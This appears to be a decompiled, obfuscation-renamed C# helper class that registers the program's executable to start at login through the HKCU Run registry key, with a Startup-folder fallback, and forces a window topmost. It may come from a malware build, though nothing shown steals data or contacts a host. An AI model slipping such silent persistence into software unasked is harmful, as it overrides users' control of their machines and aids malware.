using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Main.Tools;

internal static class Windows
{
	internal enum StartupMethodType
	{
		StartupFolder,
		Registry
	}

	private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

	private const uint SWP_NOSIZE = 1u;

	private const uint SWP_NOMOVE = 2u;

	internal static void SetStartup(StartupMethodType startupMethod)
	{
		switch (startupMethod)
		{
		case StartupMethodType.Registry:
			try
			{
				SetStartupRegistry(Config.FinalExePath);
				break;
			}
			catch
			{
				SetStartupFolder();
				break;
			}
		case StartupMethodType.StartupFolder:
			SetStartupFolder();
			break;
		}
	}

	private static void SetStartupFolder()
	{
		if (Config.FinalExeRelativePath != null)
		{
			Config.FinalExePath = Windows.smethod_2(Windows.smethod_0(Environment.SpecialFolder.Startup), Windows.smethod_1(Config.FinalExeRelativePath));
		}
	}

	private static void SetStartupRegistry(string exePath)
	{
		RegistryKey registryKey = Windows.smethod_3(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", bool_0: true);
		if (registryKey != null)
		{
			Windows.smethod_4(registryKey, Windows.smethod_1(exePath), (object)exePath);
		}
	}

	internal static void RemoveStartupRegistry(string exePath)
	{
		RegistryKey registryKey = Windows.smethod_3(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", bool_0: true);
		if (registryKey != null)
		{
			Windows.smethod_5(registryKey, Windows.smethod_1(exePath), bool_0: false);
		}
	}

	[DllImport("user32.dll")]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	internal static void MakeTopMost(Form f)
	{
		SetWindowPos(Windows.smethod_6((Control)(object)f), HWND_TOPMOST, 0, 0, 0, 0, 3u);
	}

	static string smethod_0(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	static string smethod_1(string string_0)
	{
		return Path.GetFileName(string_0);
	}

	static string smethod_2(string string_0, string string_1)
	{
		return Path.Combine(string_0, string_1);
	}

	static RegistryKey smethod_3(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		return registryKey_0.OpenSubKey(string_0, bool_0);
	}

	static void smethod_4(RegistryKey registryKey_0, string string_0, object object_0)
	{
		registryKey_0.SetValue(string_0, object_0);
	}

	static void smethod_5(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		registryKey_0.DeleteValue(string_0, bool_0);
	}

	static IntPtr smethod_6(Control control_0)
	{
		return control_0.get_Handle();
	}
}
